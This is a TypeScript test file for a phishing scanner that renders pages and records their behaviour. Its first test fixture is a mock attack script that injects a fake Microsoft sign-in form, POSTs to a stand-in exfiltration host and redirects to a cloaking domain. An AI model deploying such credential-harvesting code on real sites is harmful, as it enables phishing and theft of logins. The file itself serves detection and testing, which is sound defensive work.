import { renderAndScan } from "../src/render";
import { behaviorFindings, discoveredUrlsFromBehavior } from "../src/dynamic";
import { createScanner } from "../src/index";

function scanRuleIds(html: string, url: string): string[] {
  const scanner = createScanner({ source: { url, contentType: "text/html" } });
  scanner.feed(new TextEncoder().encode(html));
  return scanner.finish().findings.map((f) => f.ruleId);
}

test("render-and-scan surfaces an externally-injected credential form + behaviors", async () => {
  const url = "https://evil-login.example/";
  const page = `<html><head><title>Welcome</title></head><body><div id="app">Loading…</div>
    <script src="https://cdn.attacker.test/widget.js"></script></body></html>`;
  const bundle = `
    document.title = "Sign in to your Microsoft account";
    document.getElementById('app').innerHTML = '<form action="/collect.php"><input name="email" type="email"><input name="pw" type="password"></form>';
    fetch('https://exfil.bad.test/c', { method: 'POST', body: 'creds' });
    window.location.href = 'https://cloak.evil.test/next';
  `;
  const fetchScript = async (u: string) => (u.includes("widget.js") ? bundle : null);

  const { html, report } = await renderAndScan(page, { url, fetchScript });

  // The external bundle's form materialized in the rendered DOM...
  expect(html).toMatch(/type="password"/i);
  expect(html).toMatch(/Microsoft/i);
  // ...and the static rules catch it on the rendered output.
  expect(scanRuleIds(html, url)).toContain("brand_impersonation_content");
  // ...and behaviors were still recorded (this is what the old fake-DOM did).
  expect(report.network.map((n) => n.url)).toContain("https://exfil.bad.test/c");
  expect(report.redirects).toContain("https://cloak.evil.test/next");
  expect(discoveredUrlsFromBehavior(report, url)).toContain("https://cloak.evil.test/next");
  expect(behaviorFindings(report, url).length).toBeGreaterThan(0);
});

test("render-and-scan stays quiet on a benign page (no creds, no brand)", async () => {
  const { html } = await renderAndScan(
    `<html><head><title>Acme Widgets</title></head><body><div id="x"></div>
     <script src="https://cdn.acme.test/app.js"></script></body></html>`,
    { url: "https://www.acme-widgets.example/", fetchScript: async () => `document.getElementById('x').innerHTML = '<p>Welcome to Acme</p>';` }
  );
  expect(scanRuleIds(html, "https://www.acme-widgets.example/")).not.toContain("brand_impersonation_content");
  expect(scanRuleIds(html, "https://www.acme-widgets.example/")).not.toContain("credential_form_on_suspicious_host");
});
